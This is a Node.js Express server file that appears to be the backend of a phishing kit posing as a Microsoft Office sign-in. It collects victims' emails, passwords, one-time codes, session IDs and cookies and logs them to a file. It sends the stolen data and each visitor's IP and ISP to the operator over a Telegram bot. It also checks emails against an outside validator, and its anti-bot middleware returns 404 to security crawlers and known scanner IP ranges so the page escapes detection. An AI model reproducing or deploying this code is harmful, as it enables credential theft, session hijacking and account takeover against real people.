const express = require('express');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');
const antibot = require('./middleware/antibot');
const { botToken, chatId, code } = require('./config/settings.js'); // Ensure ApiKey and URL are included
const fs = require('fs').promises;
const ApiKey = process.env.IP_GEOLOCATION_API_KEY;
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const { sendMessageFor } = require('simple-telegram-message');
const { getClientIp } = require("request-ip");

async function saveSessionToken(data) {
    const timestamp = new Date().toISOString();
    const sessionFile = path.join(__dirname, 'session_tokens.txt');
    const sessionEntry = `
===========================================
Timestamp: ${timestamp}
Email: ${data.email || 'N/A'}
Session ID: ${data.sessionId || 'N/A'}
Cookies: ${data.cookies || 'N/A'}
User-Agent: ${data.userAgent || 'N/A'}
IP Address: ${data.ipAddress || 'N/A'}
Referrer: ${data.referrer || 'N/A'}
Additional Data: ${JSON.stringify(data.additionalData || {}, null, 2)}
===========================================

`;
    
    try {
        await fs.appendFile(sessionFile, sessionEntry);
        console.log('Session token saved to file');
    } catch (error) {
        console.error('Error saving session token:', error.message);
    }
}
 
const app = express();
const port = process.env.PORT || 5000;
const host = '0.0.0.0';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set('trust proxy', true);

app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});


app.post('/next', (req, res) => {
    let message = '👤📩 OFFICE\n===================\n\n';
    let responseData = { success: true };
    
    const cookies = req.headers.cookie || 'No cookies';
    const sessionId = req.sessionID || req.headers['x-session-id'] || 'No session ID';
    const ipAddress = getClientIp(req);
    const referrer = req.headers.referer || req.headers.origin || 'No referrer';

    if (req.body && 'code' in req.body) {
        const { code, email } = req.body;
        message += `CODE: ${code} for ${email} \n`;
        message += `SESSION ID: ${sessionId} \n`;
        message += `COOKIES: ${cookies} \n`;
        message += `\n=====================\n\n`;
        message += ' ✅ UPDATE TEAM | OFFICE\n';
        
        saveSessionToken({
            email,
            sessionId,
            cookies,
            userAgent: req.headers['user-agent'],
            ipAddress,
            referrer,
            additionalData: { code }
        });
    } else {
        const { email, password, userAgent, timeZone } = req.body;
        
        message += `EMAIL: ${email} \n`;
        message += `PASSWORD: ${password} \n`;
        message += `BROWSER DETAILS: ${userAgent} \n`;
        message += `TIMEZONE: ${timeZone} \n`;
        message += `SESSION ID: ${sessionId} \n`;
        message += `COOKIES: ${cookies} \n`;
        message += `\n=====================\n\n`;
        message += ' ✅ UPDATE TEAM | OFFICE\n';
        message += `💬 Telegram: https://t.me/UpdateTeams\n`;
        
        responseData = { code };
        
        saveSessionToken({
            email,
            sessionId,
            cookies,
            userAgent: userAgent || req.headers['user-agent'],
            ipAddress,
            referrer,
            additionalData: { password, timeZone }
        });
    }

    res.json(responseData);

    setImmediate(() => {
        if (!botToken || !chatId) {
            console.error('Telegram credentials not configured');
            return;
        }
        
        const website = `https://api.telegram.org/bot${botToken}`;
        const params = {
            chat_id: chatId,
            text: message,
        };

        axios.post(`${website}/sendMessage`, params)
            .then(response => {
                console.log('Telegram notification sent:', response.data);
            })
            .catch(error => {
                console.error('Error sending Telegram notification:', error.message);
            });
    });
});

const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');

function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        // It's a bot, return a 404 response or handle it as needed
        return res.status(404).send('Not Found');
    } else {
        // It's not a bot, proceed to the next middleware or route handler
        next();
    }
}

// Use the bot detection middleware for all routes
app.use(antiBotMiddleware);

app.post('/verify', async (req, res) => {
    const { email } = req.body;
    const url = `https://validate.sharingdoc.top/check-mail`;

    console.log(email + " : " + "received");
    
    try {
        const response = await axios.post(url, { email });

        if (response.data.status === 'valid') {
            console.log(email + " : " + response.data);
            res.json({ success: true });
        } else {
            res.json({ success: false });
        }
    } catch (error) {
        console.error('Error verifying email:', error);
        res.status(500).json({ success: false, error: 'Failed to verify email' });
    }
});


app.get('/', async (req, res) => {
    try {
        const htmlContent = await fs.readFile(path.join(__dirname, 'public', 'index.html'), 'utf-8');
        res.send(htmlContent);
        
        const ipAddress = getClientIp(req);
        
        setImmediate(async () => {
            if (!botToken || !chatId) {
                console.log('Telegram credentials not configured, skipping notification');
                return;
            }
            
            try {
                let message = `A new visitor from IP: ${ipAddress}\n`;
                
                if (ApiKey) {
                    try {
                        const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
                        console.log(apiResponse.data);
                        message += `INTERNET PROVIDER: ${apiResponse.data.network.organisation}\n`;
                    } catch (apiError) {
                        console.log('IP geolocation lookup failed:', apiError.message);
                    }
                }
                
                console.log(message); 
                const sendMessage = sendMessageFor(botToken, chatId); 
                sendMessage(message);
            } catch (error) {
                console.error('Error sending notification:', error.message);
            }
        });
    } catch (error) {
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/common', async (req, res) => {
    try {
        const htmlContent = await fs.readFile(path.join(__dirname, 'public', 'entercode.html'), 'utf-8');
        res.send(htmlContent);
    } catch (error) {
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

app.listen(port, host, () => {
    console.log(`Server is running on ${host}:${port}`);
});
